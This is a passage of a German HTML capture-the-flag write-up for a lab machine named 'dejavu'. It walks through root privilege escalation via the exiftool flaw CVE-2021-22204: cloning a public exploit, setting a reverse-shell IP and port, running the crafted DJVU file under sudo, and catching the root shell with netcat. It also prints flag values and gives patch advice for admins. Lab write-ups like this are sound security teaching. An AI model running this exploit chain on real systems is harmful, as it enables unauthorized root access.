+             <p class="evaluation"><strong>Bewertung: !!Schwachstelle identifiziert!!** Die Version ist 12.23. Diese Version ist bekanntlich anfällig für CVE-2021-22204, eine Schwachstelle, die Remote Code Execution (RCE) durch das Verarbeiten einer präparierten DJVU-Datei ermöglicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Finde heraus, ob `robert` `exiftool` mit erhöhten Rechten ausführen kann (z.B. über `sudo -l`) oder ob ein Prozess als Root regelmäßig `exiftool` verwendet. Da im Log später `sudo -u root exiftool ...` verwendet wird, ist anzunehmen, dass `robert` `exiftool` als Root via `sudo` ausführen darf (obwohl `sudo -l` für `robert` fehlt). Besorge einen Exploit für CVE-2021-22204.<br><strong>Empfehlung (Admin):**DRINGEND:** Update `exiftool` auf eine Version >= 12.38. Überprüfe `sudo`-Regeln für `exiftool`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+robert@dejavu:~$ <span class="command">exiftool -ver</span>
+12.23
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Zielsystem (als `robert`) wird ein bekanntes Exploit-Skript für CVE-2021-22204 von GitHub geklont und die Payload-Konfiguration (`exploit.py`) mit `nano` bearbeitet, um die IP und den Port des Angreifer-Listeners einzutragen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung des Exploits. Der Exploit wird so konfiguriert, dass er eine Reverse Shell zu 192.168.2.153 auf Port 9002 aufbaut.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe das Python-Skript aus, um die bösartige Bilddatei zu erstellen. Starte den Netcat-Listener auf Port 9002.<br><strong>Empfehlung (Admin):</strong> Patchen von Exiftool ist die primäre Maßnahme.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+robert@dejavu:/tmp$ <span class="command">git clone https://github.com/convisolabs/CVE-2021-22204-exiftool</span>
+Cloning into 'CVE-2021-22204-exiftool'...
+remote: Enumerating objects: ..., done.
+remote: Counting objects: ..., done.
+remote: Compressing objects: ..., done.
+remote: Total ... (delta ...), reused ... (delta ...), pack-reused 0
+Receiving objects: 100% (.../...), ..., done.
+Resolving deltas: 100% (.../...), done.
+robert@dejavu:/tmp$ <span class="command">cd CVE-2021-22204-exiftool</span>
+robert@dejavu:/tmp/CVE-2021-22204-exiftool$ <span class="command">nano exploit.py</span>
+                     </pre>
+                     <!-- Inhalt der Änderung (Beispiel) -->
+                     <pre>
+# Innerhalb von exploit.py geändert:
+ip = '192.168.2.153'
+port = '9002'
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das modifizierte Python-Exploit-Skript wird ausgeführt. Es generiert eine bösartige DJVU-Datei (`exploit.djvu`), die die Reverse-Shell-Payload enthält.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die präparierte Datei für den Exploit ist erstellt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe nun `exiftool` als Root (via `sudo`) auf diese Datei aus.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+robert@dejavu:/tmp/CVE-2021-22204-exiftool$ <span class="command">python3 exploit.py</span>
+    1 image files updated
+robert@dejavu:/tmp/CVE-2021-22204-exiftool$ <!-- Malicious file exploit.djvu created -->
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `robert` führt `exiftool` mit `sudo -u root` auf die präparierte Datei `exploit.djvu` aus. Gleichzeitig läuft auf dem Angreifer-System ein Netcat-Listener auf Port 9002.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Das Ausführen von `exiftool` als Root auf die bösartige Datei löst die Schwachstelle CVE-2021-22204 aus. Die eingebettete Reverse-Shell-Payload wird ausgeführt und verbindet sich zurück zum Netcat-Listener des Angreifers. Der Listener empfängt die Verbindung, und der `id`-Befehl bestätigt `uid=0(root)`. Root-Zugriff wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Suche und lies die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Update Exiftool. Korrigiere die `sudo`-Regel, die `robert` erlaubt, `exiftool` als Root auszuführen (falls eine solche Regel existiert - sie fehlt im `sudo -l` für `www-data`, muss also für `robert` spezifisch sein oder es gibt einen anderen Grund, warum er es als Root ausführen kann).</p>
+             <!-- Ausführung des Exploits auf dem Ziel -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+robert@dejavu:/tmp/CVE-2021-22204-exiftool$ <span class="command">sudo -u root exiftool ./exploit.djvu</span>
+<!-- Keine direkte Ausgabe des Befehls, löst die Shell aus -->
+                     </pre>
+                 </div>
+             </div>
+             <!-- Listener auf Kali empfängt die Shell -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                     <pre>
+listening on [any] 9002 ...
+connect to [192.168.2.153] from (UNKNOWN) [192.168.2.113] 51256
+# <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+#
+                     </pre> <!-- Root Prompt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird das Root-Verzeichnis (`/root`) untersucht und die Datei `r0ot.tXt` (ungewöhnlicher Name) gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">HMV{c62d75d636f66450980dca2c4a3457d8}</span>` wird erfolgreich gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">ls</span> <!-- Innerhalb des Exploit-Verzeichnisses auf dem Ziel -->
+configfile  exploit.djvu  exploit.py	image.jpg  image.jpg_original  lab  payload  payload.bzz  README.md
+# <span class="command">cd /root</span>
+# <span class="command">ls</span>
+r0ot.tXt  snap
+# <span class="command">cat r0ot.tXt</span>
+<span class="password">HMV{c62d75d636f66450980dca2c4a3457d8}</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/r0ot.tXt</div>
+                     <div class="flag-value"><span class="password">HMV{c62d75d636f66450980dca2c4a3457d8}</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/robert/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">HMV{c8b75037150fbdc49f6c941b72db0d7c}</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 27. Oktober 2022</p>
+    </footer>
+</body>
+</html>
